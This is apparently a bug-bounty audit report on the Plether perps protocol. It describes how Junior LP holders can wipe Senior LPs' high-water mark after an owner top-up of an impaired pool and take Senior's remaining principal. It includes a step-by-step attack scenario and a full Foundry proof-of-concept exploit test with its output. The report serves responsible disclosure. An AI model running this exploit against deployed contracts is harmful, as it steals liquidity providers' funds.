# \#99218 [SC-Low] Attacker with Junior LP shares takes Senior LPs' remaining principal by erasing Senior's high-water mark after an owner top-up with an impaired pool

**Submitted on Nov 12th 2026 at 12:52:52 UTC by @oxfuje for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99218
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief
After an owner top-up of an impaired pool, an attacker opens longs into the room the top-up creates and settles during a small price move, which zeroes both principals. `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` treats that temporary zero as a real wipeout and replaces Senior's high-water mark, so when the price returns, Senior's remaining principal goes to the attacker's Junior shares.

## Impact
Senior LPs lose all of the principal they still had before the top-up. Almost all of it becomes Junior principal, which the attacker redeems, and the rest is left as unassigned assets. No funds leave the pool during the attack. Only the ledger changes. The Junior part cannot be undone. The deeper the pool's loss, the smaller the price move needed.

## Attack Scenario
1. The pool is impaired: traders have won most of LP value, Junior principal is 0, and Senior is below its HWM. The attacker holds Junior shares, which are worth about 0 now.
2. The attacker moves a few Junior shares to a second address, which requests to redeem its whole balance. A full-balance request avoids the minimum-size check ([`TrancheVault.sol:1615`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/TrancheVault.sol#L1615)). The request matures at the next epoch.
3. The owner calls `recapitalizePool` for Senior's gap. The top-up stays pending.
4. Before any settlement, the attacker opens longs into the new room: open a short, open the long, close the short. Longs from other traders work the same way.
5. After the helper request matures, on the first tick inside the band (pool value above zero but no larger than the reserved amount; a 1.1% move in the example), the attacker calls `OrderRouter.settleLpEpoch` with that Pyth tick. This must happen before anyone else settles at a normal price (section 5).
6. In that settlement, `absorbLoss` takes Senior to 0, the top-up is booked as a fresh Senior start, and Senior's HWM drops from 900k to 890k. The second address's zero-value redeem is refunded, so the settlement does not revert.
7. The price returns and the attacker closes the long. At the next settlement, Senior is filled only to its new HWM, and 9.2k is booked as Junior principal.
8. The attacker redeems their Junior shares for their share of the 9.2k.

## Vulnerability Details
**Terms**
- **Principal:** each tranche's current share of pool value, marked to the current price.
- **High-water mark (HWM):** the amount Senior must get back before Junior receives any surplus.
- **Pool value:** pool assets minus what the pool owes traders at the current price (`distributable` in the code).
- **Top-up:** an owner `recapitalizePool` call.

**1. Losses keep the HWM on purpose.** `absorbLoss` ([`HousePoolWaterfallAccountingLib.sol:167`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L167)) takes losses from Junior first, then from Senior. It never lowers the HWM, so a hit Senior is still owed its full amount:

```solidity
/// @dev ... The senior high-water mark is deliberately unchanged so future revenue
///      continues to restore senior impairment.
```

**2. Later revenue fills Senior up to its HWM before Junior gets anything** (`distributeRevenue`, [`HousePoolWaterfallAccountingLib.sol:140-159`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L140-L159)):

```solidity
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    ...
}
nextState.juniorPrincipal += remaining;
```

**3. A top-up into zero principals overwrites the HWM** ([`HousePoolPendingPreviewLib.sol:118-121`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L118-L121)):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining; // old HWM lost
```

**4. The loss and the top-up are applied in the same settlement, at the same price.** `settleLpEpoch` calls `_reconcile` ([`HousePool.sol:1555-1599`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L1555-L1599)):
- The settleable top-up is the pending top-up, capped at pool value (`_settleablePendingClaimantBuckets`, [`HousePool.sol:1829-1834`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L1829-L1834), which calls `capClaimantBuckets`, [`HousePoolPendingPreviewLib.sol:72-82`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L72-L82)).
- `planReconcile` subtracts the pending top-up from pool value before comparing what is left with claimed principal ([`HousePoolReconcilePlanLib.sol:68-70`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L70)). So the top-up does not soften the loss.
- If pool value is no larger than the pending top-up, nothing is left for the claims. `absorbLoss` takes Junior to 0, then Senior to 0.
- `_applyPendingClaimantBucketsLive` then books the settleable top-up against that zero state, so step 3 fires.

The attack therefore needs a price where **pool value is above zero but no larger than the reserved amount**. The reserved amount is the pending top-up plus pending trading revenue plus unassigned assets (the last two are 0 in the example). If pool value is zero, no top-up is booked.

**5. Anyone can settle at the current price.** `OrderRouter.settleLpEpoch(bytes[])` is permissionless. It refreshes the mark with a current Pyth update and settles in the same call ([`OrderLiquidationBatchLogic.sol:549-581`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549-L581)). The caller cannot pick an arbitrary price. The update must be a Pyth tick from the last 15 seconds, it cannot be older than the last accepted tick, and it must be published in the current hour ([`PletherOracle.sol:762-794`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/PletherOracle.sol#L762-L794), [`PletherOracle.sol:859-863`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/PletherOracle.sol#L859-L863)).

Trades, deposits and `recapitalizePool` do not settle the pool. A settlement also needs progress (section 6), and LP requests mature on hourly epochs. So the top-up stays pending until the first settlement after a request matures, and that settlement's price decides how it is booked. This is a race. A keeper, or anyone with a matured request, can settle first at a normal price and book the top-up correctly. The attacker wins only if the price is in the band (section 8) after their helper request matures and before anyone else settles.

**6. The settlement does not revert.** It must make some progress ([`HousePool.sol:1183-1184`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L1183-L1184)). A matured Junior redeem request counts. Junior principal is 0, so the request is worth 0: it is refunded and counted as processed ([`HousePool.sol:957-991`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L957-L991)).

**7. Nobody else can join Junior cheaply.** With Junior principal at 0 and Junior supply above 0, new Junior deposits are deferred ([`HousePool.sol:494-497`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L494-L497), [`HousePool.sol:917-920`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L917-L920)). The surplus goes only to existing Junior holders.

**Worked example (illustrative numbers).** The pool starts with Senior 900k and Junior 100k. Traders win 990k (99% of the pool) over many rounds and take it out as profit, and normal settlements book the loss. The owner then tops up Senior's 890k gap. The attacker opens longs with 900k of max profit into the new room. (In this market a long gains when the basket price falls.) The price falls 1.2%, so the longs have 10.8k of open profit.

| Step | Senior principal | Senior HWM | Junior principal | Pending top-up | Pool assets |
|---|---|---|---|---|---|
| 0. Pool after trader wins | 10k | 900k | 0 | 0 | 10k |
| 1. Owner tops up 890k; attacker opens longs | 10k | 900k | 0 | 890k | 900k |
| 2. 1.2% drop: pool value is 889.2k, all of it is reserved for the top-up, `absorbLoss` | 0 | 900k | 0 | 890k | 900k |
| 3. Same settlement books the 889.2k settleable top-up | 889.2k | **890k** | 0 | 0.8k | 900k |
| 4. Price returns, the long closes flat, next settlement | 890k | 890k | **9.2k** | 0 | 900k |

In step 4, pool value is 900k. 0.8k is reserved for the rest of the top-up and claimed principal is 889.2k, so `planReconcile` sees 10k of revenue. Senior is filled only up to its new 890k HWM (0.8k), and the other 9.2k goes to Junior. The last 0.8k of the top-up finds Senior at its HWM and becomes unassigned.

Without the bug, a normal-price settlement books the top-up into Senior's 890k gap, and Senior gets back to 900k. **The bug takes 10k from Senior, which is all of its principal before the top-up.**

**8. Why this is reachable.** Before an open, the protocol checks that the larger side's max profit, plus a 0.25% buffer, is not more than pool assets minus trader claims (`_applyOpenSettlementBufferAfterPlan`, [`CfdEnginePlanLib.sol:698-777`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/CfdEnginePlanLib.sol#L698-L777)). Pending top-up cash counts in pool assets:
- Before the top-up, open max profit can be at most the LP value left, so wiping out that value needs the price to move almost 100%.
- After the top-up, new longs can raise max profit to the LP value left plus the top-up. The price then only has to move far enough for the longs' profit to equal the LP value left. With 10k left and 900k of max profit, that is a 1.1% move.

The skew limit ([`CfdEnginePlanLib.sol:468-479`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/CfdEnginePlanLib.sol#L468-L479)) is checked only on opens, so a short leg opened first and closed after the long gets past it. The more the pool has lost, the smaller the move (Senior 900k, Junior 100k, owner tops up Senior's gap):

| Pool loss | LP value left | Top-up | Price move needed |
|---|---|---|---|
| 90% | 100k | 800k | 11% |
| 97.5% | 25k | 875k | 2.8% |
| 99% | 10k | 890k | 1.1% |

Senior loses all of its remaining value for any move past that point. The attacker gains only in a band: Junior gets the LP value left minus the part of the top-up that step 3 did not book, so Junior's share is largest just past the threshold and drops to zero at twice the threshold (1.1%–2.2% in the 99% row, 11%–22% in the 90% row). A deeper move books less of the top-up in step 3 and leaves more of the surplus unassigned. So the attacker settles on the first tick inside the band. No fee or funding path lowers the move: carry flows from traders to the pool, so waiting only makes LPs richer.

Junior does not need to be 0 beforehand, because the settlement in step 2 wipes Junior before Senior, but then nothing pushes the owner to top up, and with no earlier loss the price would need to fall by most of its value.


## Root Cause
A settlement sets the pending top-up aside before it compares pool value with claimed principal ([`HousePoolReconcilePlanLib.sol:68-70`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L70)). If open trader profit at the current price takes pool value down to the reserved amount, `absorbLoss` takes both principals to zero. That loss is temporary: it is open trader profit that disappears when the price returns, and `absorbLoss` keeps the high-water mark on purpose so the recovery goes back to Senior. The same settlement then books the top-up through `applyClaimantRecapitalizationIntent` ([`HousePoolPendingPreviewLib.sol:118-121`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L118-L121)). That function sees zero principals and outstanding Senior shares, treats the state as a fresh bootstrap, and replaces Senior's high-water mark with the top-up amount. A fresh mark is right after a real wipeout, where the loss is final. Here it erases Senior's claim to a recovery that has not happened yet, so the temporary loss becomes permanent.


## Proof of Concept

## Attack Scenario
1. The pool is impaired: traders have won most of LP value, Junior principal is 0, and Senior is below its HWM. The attacker holds Junior shares, which are worth about 0 now.
2. The attacker moves a few Junior shares to a second address, which requests to redeem its whole balance. A full-balance request avoids the minimum-size check ([`TrancheVault.sol:1615`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/TrancheVault.sol#L1615)). The request matures at the next epoch.
3. The owner calls `recapitalizePool` for Senior's gap. The top-up stays pending.
4. Before any settlement, the attacker opens longs into the new room: open a short, open the long, close the short. Longs from other traders work the same way.
5. After the helper request matures, on the first tick inside the band (pool value above zero but no larger than the reserved amount; a 1.1% move in the example), the attacker calls `OrderRouter.settleLpEpoch` with that Pyth tick. This must happen before anyone else settles at a normal price (section 5).
6. In that settlement, `absorbLoss` takes Senior to 0, the top-up is booked as a fresh Senior start, and Senior's HWM drops from 900k to 890k. The second address's zero-value redeem is refunded, so the settlement does not revert.
7. The price returns and the attacker closes the long. At the next settlement, Senior is filled only to its new HWM, and 9.2k is booked as Junior principal.
8. The attacker redeems their Junior shares for their share of the 9.2k.

## Coded Proof of Concept
**Attacker model.** The attacker holds Junior shares (bought at fair value before the crisis, worth about 0 after it), plus two addresses holding 1e6 raw Junior shares each (about 0.001 USDC; shares have 9 decimals), and two trading accounts with 60k of margin. The attacker opens a long (with a temporary short leg), calls the permissionless `OrderRouter.settleLpEpoch` with the current Pyth price, closes the long, and redeems Junior. The owner's only action is an ordinary `recapitalizePool` for Senior's gap. The deployed `maxSkewRatio = 0.4` is set. Trades use the fixture's `_open`/`_close` helpers, which call `engine.processOrderTyped` as the router at the stated price. This skips the router's commit/execute flow and Pyth checks, but every engine-side check runs (margin, max-profit cap, skew). The attack settlement goes through the real `OrderRouter.settleLpEpoch` path with a Pyth update. No `vm.store`, and no `deal` on protocol contracts.

**Setup.** Save the file below as `packages/perps/test/poc/crit03/ImpairedPoolHwmReset.t.sol` on commit `a82d4fef`, then run:

```
cd packages/perps
forge test --match-path test/poc/crit03/ImpairedPoolHwmReset.t.sol -vv
```

This is the 99% row of the table in section 8. Senior starts with 900k and Junior with 100k. Over several rounds traders win almost all of LP value and withdraw it, and a normal settlement books the loss. The owner tops up 890k, and the attacker opens 895k of longs. From that state the test runs two branches. In the control branch, the next settlement is at the normal price. In the attack branch, the next settlement is at a price 1.2% lower. Both branches then close the long flat, settle at the normal price, and redeem all of the attacker's Junior shares and margin.

**Output:**
```
  after crisis (booked)
    seniorPrincipal 10000043944
    seniorHWM       901025354051
    juniorPrincipal 0
  top-up pending, attacker long open
    pendingRecap    890000000000
    pool assets     900000049365
  after band-tick settlement
    seniorPrincipal 889260049365
    seniorHWM       890000000000      <- was 901025354051
    juniorPrincipal 0
  Senior principal before top-up  10000043944
  Senior principal (control)      900004800471
  Senior principal (attack)       890000000000
  Senior LP loss                  10004800471
  Attacker funded trading         60000000000
  Attacker got back (control)     58779243473
  Attacker got back (attack)      67953169868
  Attacker profit vs control      9173926395
```

A 1.2% move is enough. Senior loses 10.0k, which is all of the principal it had before the top-up. The attacker redeems 9.17k from Junior. After all trading fees and carry, the attacker ends with 67.95k from 60k funded, a net gain of 7.95k.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {AtomicLpEpochSettlementTestFixture} from "../../perps/shared/AtomicLpEpochSettlementFixture.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// Pool: Senior 900k, Junior 100k (attacker). Traders win 99% of LP value, leaving Senior 10k vs HWM 900k.
/// Owner tops up Senior's 890k gap. Attacker opens longs into the new room and settles at a 1.2% lower price.
/// Attacker: holds Junior shares (+2 helper addresses with 1e6 raw shares), trades, calls permissionless
/// OrderRouter.settleLpEpoch at the current Pyth price. Deployed maxSkewRatio 0.4.
contract ImpairedPoolHwmResetPoC is AtomicLpEpochSettlementTestFixture {

    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant ATTACKER_SHORT = address(0xBAD5);
    address internal constant HELPER = address(0xBAD2);
    address internal constant HELPER2 = address(0xBAD3);
    address internal constant WINNER = address(0x7A0E3);
    address internal constant WINNER_SHORT = address(0x7A0E4);

    uint256 internal constant NORMAL = 1e8;
    uint256 internal constant RECAP = 890_000e6;
    uint256 internal constant ATTACK_LONG = 895_000e18;
    uint256 internal constant BAND_TICK = 98_800_000; // 1.2% lower

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  seniorPrincipal", pool.seniorPrincipal());
        console2.log("  seniorHWM      ", pool.seniorHighWaterMark());
        console2.log("  juniorPrincipal", pool.juniorPrincipal());
        console2.log("  pendingRecap   ", pool.pendingRecapitalizationAssets());
        console2.log("  pool assets    ", settlementToken.balanceOf(address(pool)));
    }

    function _tick() internal {
        vm.warp(block.timestamp + 1);
    }

    function _settleAt(
        uint256 price
    ) internal {
        _tick();
        _setBasket(price, 0, block.timestamp);
        vm.prank(ATTACKER);
        router.settleLpEpoch(_emptyUpdateData());
    }

    /// Opens a `size` long for `longT`, using a temporary short leg on `shortT` to pass the skew limit.
    function _openLongPastSkew(
        address longT,
        address shortT,
        uint256 size
    ) internal {
        uint256 chunk = pool.totalAssets() * 3 / 10 / 100e6 * 100e18; // 0.3 x depth in whole lots, at price 1
        uint256 shortTotal = size > chunk ? size - chunk : 0; // net long skew ends at 0.3 x depth
        uint256 longLeft = size;
        uint256 shortLeft = shortTotal;
        while (longLeft > 0) {
            uint256 s = shortLeft < chunk ? shortLeft : chunk;
            if (s > 0) {
                _tick();
                _open(shortT, CfdTypes.Side.SHORT, s, s / 1e12 / 30, NORMAL);
                shortLeft -= s;
            }
            uint256 l = longLeft < chunk ? longLeft : chunk;
            _tick();
            _open(longT, CfdTypes.Side.LONG, l, l / 1e12 / 30, NORMAL);
            longLeft -= l;
        }
        if (shortTotal > 0) {
            _tick();
            _close(shortT, CfdTypes.Side.SHORT, shortTotal, NORMAL); // closes are not skew-limited
        }
    }

    function _withdrawAll(
        address t
    ) internal returns (uint256 amt) {
        amt = _settlementBalance(t);
        vm.prank(t);
        clearinghouse.withdraw(t, amt);
    }

    function _crisis() internal {
        uint256 target = 10_000e6;
        _fundTrader(WINNER, 300_000e6);
        _fundTrader(WINNER_SHORT, 300_000e6);
        uint256 lpValue = settlementToken.balanceOf(address(pool));
        while (lpValue > target + 1e6) {
            uint256 notional = (lpValue - target) * 5; // a 20% move on this notional wins lpValue - target
            if (notional > lpValue * 95 / 100) notional = lpValue * 95 / 100; // stay under the max-profit cap
            uint256 size = notional / 100e6 * 100e18; // whole lots
            _openLongPastSkew(WINNER, WINNER_SHORT, size);
            _tick();
            _close(WINNER, CfdTypes.Side.LONG, size, NORMAL * 8 / 10);
            lpValue = settlementToken.balanceOf(address(pool));
        }
        _withdrawAll(WINNER);
    }

    function _recoverAndExit() internal returns (uint256 attackerNet, uint256 seniorPrincipal) {
        _tick();
        _close(ATTACKER, CfdTypes.Side.LONG, ATTACK_LONG, NORMAL);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 bal = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 id = juniorVault.requestRedeem(bal, ATTACKER, ATTACKER);
        _warpToEpoch(id);
        _settleAt(NORMAL);
        _log("after normal-price settlement");
        uint256 shares = juniorVault.maxRedeem(ATTACKER);
        uint256 juniorExit;
        if (shares > 0) {
            vm.prank(ATTACKER);
            juniorExit = juniorVault.redeem(shares, ATTACKER, ATTACKER);
        }
        console2.log("  attacker Junior exit", juniorExit);
        attackerNet = juniorExit + _withdrawAll(ATTACKER) + _withdrawAll(ATTACKER_SHORT);
        seniorPrincipal = pool.seniorPrincipal();
    }

    function test_TopUpAfterImpairment_SettleAtBandTick_JuniorTakesSeniorPrincipal() public {
        CfdTypes.RiskParams memory rp = _riskParams();
        rp.maxSkewRatio = 0.4e18; // deployed value (script/DeployPerpsArbitrumSepolia.s.sol)
        _setRiskParams(rp);

        _fundSenior(SENIOR_LP, 900_000e6);
        _fundJunior(ATTACKER, 100_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        vm.startPrank(ATTACKER);
        juniorVault.transfer(HELPER, 1e6);
        juniorVault.transfer(HELPER2, 1e6);
        vm.stopPrank();

        // ---- Crisis: traders win 99% of LP value; a normal settlement books the loss ----
        _crisis();
        uint256 h2 = juniorVault.balanceOf(HELPER2);
        vm.prank(HELPER2);
        _warpToEpoch(juniorVault.requestRedeem(h2, HELPER2, HELPER2));
        _settleAt(NORMAL);
        _log("after crisis (booked)");
        uint256 senior0 = pool.seniorPrincipal();

        // ---- Owner tops up Senior's gap; the top-up stays pending ----
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);

        // ---- Attacker opens longs into the new room and queues a zero-value redeem for progress ----
        uint256 funded = 60_000e6;
        _fundTrader(ATTACKER, funded / 2);
        _fundTrader(ATTACKER_SHORT, funded / 2);
        _openLongPastSkew(ATTACKER, ATTACKER_SHORT, ATTACK_LONG);
        uint256 h = juniorVault.balanceOf(HELPER);
        vm.prank(HELPER);
        uint256 helperId = juniorVault.requestRedeem(h, HELPER, HELPER);
        _warpToEpoch(helperId);
        _log("top-up pending, attacker long open");

        uint256 snap = vm.snapshotState();

        // ---- Control: next settlement at a normal price ----
        (uint256 netControl, uint256 seniorControl) = _recoverAndExit();
        vm.revertToState(snap);

        // ---- Attack: one permissionless settlement at a 1.2% lower price ----
        _settleAt(BAND_TICK);
        _log("after band-tick settlement");
        (uint256 netAttack, uint256 seniorAttack) = _recoverAndExit();

        console2.log("Senior principal before top-up ", senior0);
        console2.log("Senior principal (control)     ", seniorControl);
        console2.log("Senior principal (attack)      ", seniorAttack);
        console2.log("Senior LP loss                 ", seniorControl - seniorAttack);
        console2.log("Attacker funded trading        ", funded);
        console2.log("Attacker got back (control)    ", netControl);
        console2.log("Attacker got back (attack)     ", netAttack);
        console2.log("Attacker profit vs control     ", netAttack - netControl);

        assertGe(seniorControl, 900_000e6 - 1e6, "control: top-up restores Senior");
        assertGe(seniorControl - seniorAttack, senior0 * 9 / 10, "Senior loses ~all pre-top-up principal");
        assertGt(netAttack, funded, "attacker ends with more than it put in");
    }

}
```

